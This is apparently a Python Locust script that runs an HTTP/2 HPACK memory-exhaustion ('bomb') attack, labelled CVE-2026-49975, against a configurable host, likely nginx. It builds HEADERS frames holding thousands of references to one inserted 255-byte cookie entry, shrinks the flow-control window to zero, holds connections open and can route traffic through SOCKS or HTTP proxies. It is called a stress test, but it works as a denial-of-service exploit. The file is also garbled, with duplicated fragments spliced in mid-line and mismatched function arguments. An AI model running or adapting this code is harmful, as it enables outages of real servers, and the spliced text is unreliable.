#!/usr/bin/env python3
from locust import User, task, constant, events
import socket, ssl, struct, time, logging, os
logger = logging.getLogger(__name__)
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))
SOCKS5_PROXY = os.environ.get("SOCKS5_PROXY", "").strip()
HTTP_PROXY = os.environ.get("HTTP_PROXY", "").strip()
HTTPS_PROXY = os.environ.get("HTTPS_PROXY", "").strip()
PROXY_URL = SOCKS5_PROXY or HTTP_PROXY or HTTPS_PROXY or ""
def parse_proxy(proxy_url):
    if not proxy_url:
        return None, None, None
    proxy_url = proxy_url.strip()
    if "://" not in proxy_url:
        if SOCKS_AVAILABLE:
            parts = proxy_url.rsplit(":", 1)
            return socks.SOCKS5, parts[0].strip(), int(parts[1])
        return None, None, None
    if proxy_url.startswith("socks5://"):
        if not SOCKS_AVAILABLE:
            return None, None, None
        t = socks.SOCKS5
        r = proxy_url[8:]
    elif proxy_url.startswith("socks4://"):
        if not SOCKS_AVAILABLE:
            return None, None, None
        t = socks.SOCKS4
        r = proxy_url[9:]
    elif proxy_url.startswith("http://") or proxy_url.startswith("https://"):
        t = "http"
        r = proxy_url.split("://", 1)[1]
    else:
        return None, None, None
    if "@" in r:
        r = r.split("@")[-1]
    if ":" in r:
        h, ps = r.split(":", 1)
        return t, h, int(ps.split("/")[0])
    return t, r, 1080
def create_connection_with_proxy(address, timeout=None, proxy_params=None):
    pt, ph, pp = proxy_params or (None, None, None)
    if pt and SOCKS_AVAILABLE:
        if pt in (socks.SOCKS5, socks.SOCKS4):
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(pt, ph, pp, os.environ.get("SOCKS5_USER", ""), os.environ.get("SOCKS5_PASS", ""))
            if timeout:
                s.settimeout(timeout)
            s.connect(address)
            return s
    return socket.create_connection(address, timeout=timeout)
PROXY_PARAMS = parse_proxy(PROXY_URL)
CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
def build_frame(ft, fl, sid, pl):
    l = len(pl)
    return struct.pack(">I", l)[1:] + struct.pack("BB", ft, fl) + struct.pack(">I", sid & 0x7FFFFFFF) + pl
def build_settings(iws=0, mfs=16384):
    payload = struct.pack(">HI", 0x04, iws) + struct.pack(">HI", 0x05, mfs)
    return build_frame(0x04, 0x00, 0, payload)
def build_headers_frame(sid, iref=2048):
    name = b"cookie"
    value = b"a" * 255
    insert_prefix = bytes([0x40, len(name)]) + name + bytes([len(value)]) + value
    payload = insert_prefix + bytes([0xBE]) * iref
    return build_frame(0x01, 0x04 | 0x01, sid, payload)
class Http2BombUser(User):
    wait_time = constant(0)
    references_per_stream = REFERENCES
    streams_per_connection = STREAMS
    hold_seconds = HOLD_SECONDS
    _ssl_ctx = None
    @classmethod
    def _get_ssl_ctx(cls):
        if cls._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx
    def _parse_host(self):
        host = self.host or "https://127.0.0.1"
        if host.startswith("https://"):
            rest, use_tls, dp = host[8:], True, 443
        elif host.startswith("http://"):
            rest, use_tls, dp = host[7:], False, 80
        else:
            rest, use_tls, dp = host, True, 443
        if ":" in rest:
            hn, ps = rest.split(":", 1)
            return hn, int(ps.split("/")[0]), use_tls
        return rest.split("/")[0], dp, use_tls
    @task
    def http2_bomb_attack(self):
        hn, p, tls = self._parse_host()
        sock = None
        st = time.time()
        exc = None
        try:
            sock = create_connection_with_proxy((hn, p), timeout=10.0, proxy_params=PROXY_PARAMS)
            if tls:
                sock = self._get_ssl_ctx().wrap_socket(sock, server_hostname=hn)
            sock.sendall(CLIENT_PREFACE)
            sock.sendall(build_settings(initial_window_size=0))
            for sid in range(1, 2 * self.streams_per_connection, 2):
                sock.sendall(build_headers_frame(sid, self.references_per_stream))
            if self.hold_seconds > 0:
                et = time.time() + self.hold_seconds
                while time.time() < et:
                    try:
                        sock.settimeout(1.0)
                        d = sock.recv(4096)
                        if not d:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break
        except Exception as e:
            exc = e
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            tt = int((time.time() - st) * 1000)
            pn = "proxy" if PROXY_URL else "direct"
            rn = "/ (refs=" + str(self.references_per_stream) + ", hold=" + str(self.hold_seconds) + "s, via=" + pn + ")"
            self.environment.events.request.fire("H2-BOMB", rn, tt, 0, exc, {})
@events.init.add_listener
def on_start(env, **kw):
    pd = PROXY_URL if PROXY_URL else "直连"
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info("  并发用户数     : " + str(env.runner.target_user_count))
    logger.info("  HPACK 引用次数 : " + str(REFERENCES))
    logger.info("  连接保持秒数   : " + str(HOLD_SECONDS))
    logger.info("  目标地址       : " + str(env.host))
    logger.info("  代理设置       : " + pd)
    logger.info("  测试时长       : " + str(env.runner.run_time) + "秒")
    logger.info("=" * 60)ls(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx

    def _parse_host(self):
        """解析目标主机信息"""
        host = self.host or "https://127.0.0.1"

        if host.startswith("https://"):
            rest = host[8:]
            use_tls = True
            default_port = 443
        elif host.startswith("http://"):
            rest = host[7:]
            use_tls = False
            default_port = 80
        else:
            rest = host
            use_tls = True
            default_port = 443

        if ":" in rest:
            parts = rest.split(":", 1)
            hostname = parts[0]
            port_str = parts[1].split("/")[0]
            port = int(port_str)
        else:
            hostname = rest.split("/")[0]
            port = default_port

        return hostname, port, use_tls

    @task
    def http2_bomb_attack(self):
        """执行一次 HTTP/2 HPACK 炸弹攻击"""
        hostname, port, use_tls = self._parse_host()
        sock = None
        start_time = time.time()
        exception = None

        try:
            # 建立 TCP 连接
            sock = create_connection_with_proxy(
                (hostname, port),
                timeout=10.0,
                proxy_params=PROXY_PARAMS,
            )

            # TLS 握手
            if use_tls:
                sock = self._get_ssl_ctx().wrap_socket(
                    sock,
                    server_hostname=hostname,
                )

            # 发送 HTTP/2 前言
            sock.sendall(CLIENT_PREFACE)

            # 发送 SETTINGS 帧（关闭流量控制窗口）
            sock.sendall(build_settings(initial_window_size=0))

            # 发送 HPACK 炸弹 HEADERS 帧
            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            # 保持连接存活，阻止内存释放
            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

        except Exception as e:
            exception = e

        finally:
            # 关闭连接
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            # 上报请求统计
            total_time = int((time.time() - start_time) * 1000)

            if PROXY_URL:
                proxy_name = "proxy"
            else:
                proxy_name = "direct"

            request_name = "/ (refs=" + str(self.references_per_stream)
            request_name += ", hold=" + str(self.hold_seconds) + "s"
            request_name += ", via=" + proxy_name + ")"

            self.environment.events.request.fire(
                request_type="H2-BOMB",
                name=request_name,
                response_time=total_time,
                response_length=0,
                exception=exception,
                context={},
            )


# ============================================================
# 启动信息
# ============================================================

@events.init.add_listener
def on_test_start(environment, **kw):
    """测试启动时输出配置信息"""
    if PROXY_URL:
        proxy_display = PROXY_URL
    else:
        proxy_display = "直连"

    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info("  并发用户数     : " + str(environment.runner.target_user_count))
    logger.info("  HPACK 引用次数 : " + str(REFERENCES))
    logger.info("  连接保持秒数   : " + str(HOLD_SECONDS))
    logger.info("  每连接流数     : " + str(STREAMS))
    logger.info("  目标地址       : " + str(environment.host))
    logger.info("  代理设置       : " + proxy_display)
    logger.info("  测试时长       : " + str(environment.runner.run_time) + "秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)   logger.info(f"  HPACK 引用次数     : {REFERENCES}")
    logger.info(f"  连接保持秒数       : {HOLD_SECONDS}")
    logger.info(f"  每连接流数         : {STREAMS}")
    logger.info(f"  目标地址           : {environment.host}")
    logger.info(f"  代理设置           : {proxy_display}")
    logger.info(f"  测试时长           : {environment.runner.run_time}秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)